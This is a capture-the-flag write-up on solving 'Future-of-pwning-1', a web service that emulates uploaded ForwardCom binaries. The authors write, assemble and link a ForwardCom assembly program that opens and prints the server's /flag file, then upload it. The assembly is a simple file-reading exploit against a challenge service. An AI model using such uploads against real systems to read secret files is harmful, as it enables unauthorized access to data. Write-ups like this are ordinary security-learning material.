# Future-of-pwning-1 Writeup from L.A.R.S.

## Setup

In order to test stuff it seems to make sense to set up the docker container:
```bash
docker build -t future-of-pwning-1 . && docker run -p 5000:5000 --rm -it future-of-pwning-1
```

For the remote instance, we run (as always):
```bash
ncat --ssl future-of-pwning-1.ctf.kitctf.de 443
```
and enter our team token. This gives us an instance we can access for 4 minutes. Tight but doable!

## Looking around

### Dockerfile

Here we see that the *ForwardCom* binary tools are fetched and installed. Then the `forw` executable and the `instruction_list.csv` are copied to the `app` directory.
We can also notice that those two files are already available to us in the original `tar.gz`.
Lastly we observe that the flag is stored in `/flag`.

### app.py

Here we see a simple webserver written in *Python* that allows us to upload a file that's stored as `/tmp/binary.ex`.
The file is then emulated with `/app/forw -emu /tmp/binary.ex` and the last 500 characters are returned.


## Exploiting

### The idea

So apparently we can emulate *any* file in the *ForwardCom* file format `.ex`.
Looking at the [Github page](https://github.com/ForwardCom) we learn that ForawrdCom is an
> [e]xperimental instruction set and computer system with variable-length vector registers.

There we also find a [manual](https://github.com/ForwardCom/manual), [code examples](https://github.com/ForwardCom/code-examples) and the [bintools](https://github.com/ForwardCom/bintools) which *should* compile to the executable `forw` we already have.
So it *should* be rather straight forward to use this information to simply read the flag from `/flag` and output it to `stdout`.

### Hello ForwardCom world!

However, *ForwardCom* doesn't seem so popular, sadly.
They do have [47](https://github.com/orgs/ForwardCom/followers) followers at the time of writing, but none seems to have published an example on how to read a file!

So, let's first get familiar with the assembly language of *ForwardCom*.
It seems to be a reasonable approach to start with a *Hello world* project. Therefore we can look in the examples' `hello.as`:
```asm
/****************************  hello.as  **************************************
* Author:        Agner Fog
* date created:  2018-02-23
* last modified: 2021-08-04
* Version:       1.11
* Project:       ForwardCom example, assembly code
* Description:   Hello world example
*
* Copyright 2018-2021 GNU General Public License http://www.gnu.org/licenses
*****************************************************************************/

extern _puts: function                           // library function: write string to stdout

const section read ip                            // read-only data section
hello: int8 "\nHello ForwardCom world!", 0       // char string with terminating zero
const end

code section execute                             // executable code section

_main function public                            // program start

// breakpoint                                    // uncomment this if you want to wait for user to press run

int64 r0 = address([hello])                      // calculate address of string
call _puts                                       // call puts. parameter is in r0
int r0 = 0                                       // program return value
return                                           // return from main

_main end

code end
```

This seems decently well documented, but before trying to understand it, let's try to run it.
In the [README](https://github.com/ForwardCom/code-examples/blob/master/README.md) of the examples there are some instructions on how to emulate it.
Since we don't have `forw` in our path, we first run `./forw -ass hello.as` to assemble it. This works fine.

Now we have a `hello.ob` that we want to link:
```bash
/forw -link hello.ex hello.ob libc_light.li libc.li math.li

Linking file hello.ex

Error 107: Cannot read input file libc_light.li
Error 107: Cannot read input file libc.li
Error 107: Cannot read input file math.liAdding object files: hello.ob
```

Oh no! This seems to have failed :(
The problem is that we don't have the "needed" libraries. Needed in quotes, because why do we need three libraries, including `math.li` for hello world?
If we check out the source code again, we see that the only *library function* we use is `_puts`; surely that's contained in `libc.li`?

Luckily enough, if we look around on `ForwardCom`s Github page a bit longer, we find a repository with [libraries](https://github.com/ForwardCom/libraries). There we also find the needed [libc.li](https://github.com/ForwardCom/libraries/blob/master/libc.li) which we can download.
With this we can now run the linker:
```bash
./forw -link hello.ex hello.ob libc.li

Linking file hello.ex
Adding object files: hello.ob
Using library members: libc.li:puts.ob libc.li:raise_event.ob libc.li:startup.ob
```

Looking good! Let's emulate it:
```bash
./forw -emu hello.ex

Hello ForwardCom world!
```

Well, hello there!

### Reading stuff

Looking at the assembly of this hello world program, we can see how library calls seem to work:
- Declare the library function with `extern <function-name>: function` before the first section
- Store any read-only variables in between `const section read ip` and `const end`, in the format (for strings) of `<variable-name>: int8 "\n<text>", 0`
- Program code itself is in between `_main function public` and `_main end`
- Parameters are stored in `r<index>` (presumably the first one in `r0`, potential second one in `r1` and so on
- String parameters are applied like `int64 r<index> = address([<variable-name>])`
- The function is called with `call <function-name>`
- the rest isn't touched

As the [library repository says](https://github.com/ForwardCom/libraries/blob/master/README.md), `lic.li`
> [c]ontains the most important C standard functions.
Also in the repository we can see the `.as` files for the individual functions. We can learn from `hello.as` that function names have an underscore pretended though.
But then we can basically do C coding! In C our program could look like this:
```C
#include <stdio.h>

#define PATH "/flag"
#define MODE "r"
#define BUFFER_SIZE 256

int main()
{
    char buf[BUFFER_SIZE];
    FILE *file = fopen(PATH, MODE);
    fgets(buf, BUFFER_SIZE, file);
    puts(buf);
    return 0;
}
```

Except for the `buf` allocation, we already know how to do all of this stuff.
For memory allocation we can look into the code examples again -- specifically [`guess_number.as`](https://github.com/ForwardCom/code-examples/blob/master/guess_number.as) sounds promising, since it should expect user input and thus store strings.
Here there's two relevant regions:
```asm
%buffersize = 0x20                               // size of input text buffer
// ...
bss section datap uninitialized                  // uninitialized read/write data section
int64 parlist[4]                                 // parameter list for printf
int8 buf[buffersize]                             // input buffer
bss end
```

So we can statically allocate memory in the `datap uninitialized` section.
Now by modifying the `hello.as` program it's quite straight forward to implement our solution:
```asm
%buffersize = 256

extern _fopen: function
extern _fgets: function
extern _puts: function

const section read ip
path: int8 "/flag", 0
mode: int8 "r", 0
const end

bss section datap uninitialized
int8 buf[buffersize]
bss end

code section execute

_main function public

// fopen
int64 r0 = address([path])
int64 r1 = address([mode])
call _fopen

// read
int64 r2 = r0
int64 r0 = address([buf])
int64 r1 = buffersize
call _fgets

// print
int64 r0 = address([buf])
call _puts

int r0 = 0
return

_main end

code end
```

Let's give it a try!
```bash
./forw -ass exploit.as 

Assembling exploit.as to exploit.ob
./forw -link exploit.ex exploit.ob libc.li

Linking file exploit.ex
Adding object files: exploit.ob
Using library members: libc.li:fgets.ob libc.li:fopen.ob libc.li:puts.ob libc.li:raise_event.ob libc.li:startup.ob
```
This gives us an `exploit.ex` that we can upload in our docker, that is to `http://localhost:5000/`. And indeed, the browser displays `GPNCTF{fake_flag}`.

So, upload it to the remote and we have our flag! **Yay!**
